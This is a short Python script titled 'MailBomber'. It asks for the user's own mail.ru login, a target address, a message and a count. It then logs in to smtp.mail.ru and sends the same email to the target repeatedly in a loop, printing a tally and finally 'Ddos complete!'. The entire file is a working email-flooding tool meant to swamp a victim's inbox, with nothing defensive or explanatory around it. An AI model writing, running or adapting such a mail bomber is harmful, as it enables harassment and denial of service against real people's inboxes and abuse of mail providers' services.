from email.message import EmailMessage
import smtplib

i = 0
banner = """
 ____________________________________________________
|                                                    |
| [--] Name: MailBomber                              |
|                                                    |                          
|     											     |
|   (library: secure-smtplib)  						 |
|													 |
| [--] Created by: Asort97                           | 
|                                    ________        |               
|                                    0  ||  0        |
| [--] Version: 1.0                                  |
|                                     \-<>-/         |
|      Good LUCK!!!!                                 |
|____________________________________________________|
"""
print(banner)

_email = input("Enter YOUR MAIL: ")
_password = input("Enter YOUR PASSWORD: ")

_ToEmail = input("Enter target mail: ")
_InTitle = input("Enter your title for letter: ")
_InLetter = input("Enter your message: ")
sum_message = input("How many letter send?: ")

_msg = EmailMessage();

_msg['Subject'] = _InTitle
_msg['From'] = _email
_msg['To'] = _ToEmail

message = _InLetter
_msg.set_content(message)

for i in range(0, int(sum_message)):
    with smtplib.SMTP_SSL('smtp.mail.ru', 465) as smtp:
        smtp.login(_email, _password)
        smtp.send_message(_msg)
        i += 1
        print("Letter sended!: " + str(i))

input("Ddos complete!")